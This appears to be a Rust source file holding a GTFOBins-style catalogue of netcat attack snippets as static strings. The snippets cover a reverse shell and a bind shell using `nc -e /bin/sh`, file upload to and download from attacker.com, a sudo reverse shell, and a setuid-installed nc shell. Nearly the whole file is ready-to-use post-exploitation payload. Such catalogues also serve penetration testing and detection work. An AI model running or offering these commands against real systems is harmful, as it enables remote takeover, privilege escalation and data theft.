pub static BIN_NAME: &'static str = "nc";
pub static RS_DESC: &'static str = "Run `nc -l -p 12345` on the attacker box to receive the shell. This only works with netcat traditional.";
pub static RS_CODE: &'static str = r#"
    
    RHOST=attacker.com
    RPORT=12345
    nc -e /bin/sh $RHOST $RPORT
"#;
pub static BS_DESC: &'static str = "Run `nc target.com 12345` on the attacker box to connect to the shell. This only works with netcat traditional.";
pub static BS_CODE: &'static str = r#"
    
    LPORT=12345
    nc -l -p $LPORT -e /bin/sh
"#;
pub static FU_DESC: &'static str = "Send a local file via TCP. Run `nc -l -p 12345 > 'file_to_save'` on the attacker box to collect the file.";
pub static FU_CODE: &'static str = r#"
    
    RHOST=attacker.com
    RPORT=12345
    LFILE=file_to_send
    nc $RHOST $RPORT < "$LFILE"
"#;
pub static FD_DESC: &'static str = "Fetch a remote file via TCP. Run `nc target.com 12345 < 'file_to_send'` on the attacker box to send the file.";
pub static FD_CODE: &'static str = r#"
    
    LPORT=12345
    LFILE=file_to_save
    nc -l -p $LPORT > "$LFILE"
"#;
pub static SUDO_DESC: &'static str = "Run nc -l -p 12345 on the attacker box to receive the shell. This only works with netcat traditional.";
pub static SUDO_CODE: &'static str = r#"
    
    RHOST=attacker.com
    RPORT=12345
    sudo nc -e /bin/sh $RHOST $RPORT
"#;
pub static LSUID_DESC: &'static str = "Run nc -l -p 12345 on the attacker box to receive the shell. This only works with netcat traditional.";
pub static LSUID_CODE: &'static str = r#"
    
    sudo install -m =xs $(which nc) .

    RHOST=attacker.com
    RPORT=12345
    ./nc -e /bin/sh $RHOST $RPORT
"#;
use crate::code::{Code, Tag};
pub static RS: Code<'static> = Code { 
	title: "RS_CODE",
	code: RS_CODE,
	tag: Tag::RS,
};
pub static BS: Code<'static> = Code { 
	title: "BS_CODE",
	code: BS_CODE,
	tag: Tag::BS,
};
pub static FU: Code<'static> = Code { 
	title: "FU_CODE",
	code: FU_CODE,
	tag: Tag::FU,
};
pub static FD: Code<'static> = Code { 
	title: "FD_CODE",
	code: FD_CODE,
	tag: Tag::FD,
};
pub static SUDO: Code<'static> = Code { 
	title: "SUDO_CODE",
	code: SUDO_CODE,
	tag: Tag::SUDO,
};
pub static LSUID: Code<'static> = Code { 
	title: "LSUID_CODE",
	code: LSUID_CODE,
	tag: Tag::LSUID,
};
